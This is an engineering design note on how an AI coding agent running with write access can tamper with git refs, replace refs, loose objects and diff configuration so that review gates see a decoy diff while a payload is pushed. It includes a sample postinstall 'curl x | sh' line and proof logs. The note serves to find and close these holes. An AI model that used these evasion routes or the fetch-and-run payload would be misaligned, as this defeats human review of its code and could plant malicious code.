# The gate reads a diff the agent can rewrite

Design, 2026-08-23. Tracked as BP-382. Found while reviewing BP-381; independent of it.

## The problem

Every gate judges `DiffStats`, and `collectDiff` computes it as `${baseBranch}...HEAD`
(`worker/src/diff.ts:70`) — where `baseBranch` is a **ref name**, resolved to a local
`refs/heads/main` in the clone the worktree is linked to.

The agent runs with `--permission-mode bypassPermissions` and `--tools "Read Edit Write Grep Glob"`
(`worker/src/executor.ts:215`). `cwd` is the worktree, but nothing confines it there — no
`--add-dir`, no sandbox — and `Write` takes absolute paths. A linked worktree's `.git` is a file
naming the common directory, so the ref store is reachable with Read and Write alone.

**So the diff every gate reads is computed against something the subject of the measurement can
rewrite.** This was proved, not argued (see *Proof* below): one file write into `refs/heads/main`
takes `protected-paths` from REFUSES to PASSES on a `package.json` carrying a `postinstall`, while
the payload stays in the branch and reaches the remote. `diff-size` measures the emptied diff too,
and `review` reads the emptied patch.

Two neighbouring facts, both reachable without an attacker:

- Nothing under `worker/src/` ever runs `git fetch`, and `workspace.create` calls
  `git worktree add -B <branch> <path>` with no commit-ish (`worker/src/workspace.ts:80`), so the
  branch is based on whatever the parent clone's HEAD happens to be. The diff range is already only
  as trustworthy as the last thing an operator did in that checkout.
- `delivery.push` pushes `-- <branch>`, which git resolves in the **shared ref store** rather than
  from the worktree's HEAD. Anything that checks `git rev-parse HEAD` before pushing is not
  checking what gets sent.

## What this changes

The principle is one sentence: **nothing the worker checks may name a git ref.**

### The base becomes a sha, captured before the agent runs

`workspace.create` resolves the base branch to a commit sha **off the wire, outside any repository**, creates the
worktree **at that sha**, and returns it alongside the path. The sha lives in the worker process
for the rest of the run. `collectDiff` takes it instead of a branch name.

Held in memory rather than written anywhere: a sha stored in the repository is a sha the agent can
edit, which is the whole bug repeating one level down.

### The diff compares two trees, not two ranges

`git diff <baseSha> HEAD` rather than `git diff <base>...HEAD`. Three-dot was there so a base branch
moving concurrently could not pollute the diff; a captured sha does not move, and a direct tree
comparison cannot be narrowed by any history the agent constructs. A rewritten merge-base is exactly
the trick the range form fell for.

### A run verifies its own commits before delivering

`commitAll` is the only thing in the worker that commits, so the run knows every sha it created.
Before the first delivery step, `git rev-list <baseSha>..HEAD` must be exactly those shas, newest
first, and `HEAD` must be the last of them. Anything else — a rewritten HEAD, a grafted commit, an
unreadable range — refuses the delivery rather than shipping a tree nothing judged.

### Delivery names the commit

`git push origin <commit>:refs/heads/<branch>` instead of `-- <branch>`. Measured: `--force-with-lease`
with an explicit refspec works both when the branch is new on the remote and when it is being
updated, so the existing flags are kept as they are.

### Fetching the base is the only path, and it is load-bearing

This section said the opposite in the first draft: that fetching was a separate, droppable step
fixing freshness rather than security, and that a failed fetch would fall back to the local ref
because "freshness degrades, the security property does not". **Both halves were wrong, and the
work that proved it is why this section is rewritten rather than edited.**

Pinning the remote URL was not enough: `url.<x>.insteadOf` rewrites every URL git sees, including
one passed literally in argv, so a lookup run anywhere inside the checkout resolves through config
the agent writes. Nor is `os.tmpdir()` a boundary — the agent is handed `TMPDIR`, and a planted
`.git` there redirected the base of every later run on that machine, in every project. Measured,
and reproduced end to end against the compiled worker. The lookup therefore runs in a directory the
worker creates per call (`mkdtemp`, 0700, unpredictable name) with `GIT_DIR` set explicitly, which
makes git skip repository discovery outright rather than bounding it.

And the fallback **was** the security property, not a convenience: an agent that can make the fetch
fail can choose the local ref, which is the thing this design exists to stop trusting. There is no
fallback. A base that cannot be established ends the run.

That failure is the **machine's**, not the task's, and saying so matters: charging it spent the
attempt, and because `loop.ts` skips its sleep whenever anything was claimed and nothing resets
`execution.attempts`, one network blip walked the entire approved queue into the escalation column
in milliseconds, permanently. It now releases with the attempt refunded and reports a machine fault,
so the loop stops claiming for the rest of the pass.

### Deliberately not in scope

Confining the agent to its worktree. `Write` reaching the ref store is what makes this exploitable,
and a sandbox would close a family of holes rather than this one — but it is a larger question about
how the CLI is invoked, and not trusting the ref store is the cheaper half that closes this on its
own.

### The ref store is not the only thing a sha can be lied about

A captured base sha and a two-tree comparison are necessary and **not sufficient**. Two mechanisms
substitute what git reads back for a sha without touching the commit graph that `rev-list` and
`rev-parse` walk, so every check in this design can agree while a gate reviews a tree that is not
what gets pushed.

**`refs/replace/*`.** Measured 2026-08-23:

```
rev-parse HEAD                : 00d8683…   the real commit — every sha check passes
rev-list BASE..HEAD           : 00d8683…   likewise
git diff BASE HEAD            : +{"name":"t","description":"harmless"}
git --no-replace-objects diff : +{"name":"t","scripts":{"postinstall":"curl x | sh"}}
```

A replace ref is a file the agent writes directly. It was confirmed live end to end: the unguarded
diff shows the decoy while `git push` transmits the payload. Closed by `GIT_NO_REPLACE_OBJECTS=1` in
`GIT_SAFE_ENV` — one place, since every worker git invocation spreads it and `hardenedGitConfig()`
spreads it too. It belongs in the environment rather than in `SAFE_CONFIG` because there is no `-c`
equivalent.

**Overwriting a loose object file.** Git does not re-verify a loose object's hash on read, so
rewriting `.git/objects/xx/yy…` substitutes content for a sha in the same shape — and
`GIT_NO_REPLACE_OBJECTS` does **not** close it. It cannot deliver a payload: the transmitted bytes
are the stored bytes, so the remote's `index-pack` names the object by its true hash and the
connectivity check fails. The reachable damage is that a gate reviews a decoy and the push then
dies. Left open here, tracked separately.

**The generalisation worth carrying forward:** "do not name a ref" was too narrow. The rule is that
**nothing git reads back for a sha is trustworthy while the agent can write under `.git`** — refs,
replace refs, loose objects, and the remote URLs a fetch resolves through. Each check on this branch
had to be re-examined against that, not against the ref-name rule the spec opened with.

### What git reads back for a sha, continued

`diff.external` replaces the patch git prints with a program's output, and `diff.<driver>.textconv`
does the same through a per-path attribute in `.git/info/attributes` — untracked, shared with every
linked worktree, and invisible to `protected-paths`. Measured under the exact production argv: the
patch came back empty and the textconv program **ran**, which is the Bash this pipeline deliberately
took away from the agent, handed back before any gate's verdict. Closed with `--no-ext-diff` and
`--no-textconv` on both diff invocations.

## Proof

Run 2026-08-23 in a throwaway repository, measured with the worker's own compiled `collectDiff` and
`protectedPathsGate` rather than a re-implementation.

```
CONTROL — no ref rewritten
  changedFiles : ["README.md","package.json"]
  gate verdict : REFUSES

ATTACK — refs/heads/main advanced by a single file write
  changedFiles : ["README.md"]
  gate verdict : PASSES

FIXED — same tampered repository, collectDiff handed the captured base sha
  changedFiles : ["README.md","package.json"]
  gate verdict : REFUSES
```

And separately, for the push:

```
accepted commit                             : e6ffd1e…
git rev-parse HEAD                          : e6ffd1e…   ("matches, push it")
refs/heads/bp-2/worker (what push resolves) : 832dc21…
remote received                             : the payload
```

## Testing

The two attacks above become integration tests against real git repositories, in the style of
`delivery.hooks.integration.test.ts` — a mocked runner could only show that the flags were spelled
correctly. Each is checked for vacuity by reverting the fix and confirming it goes red.
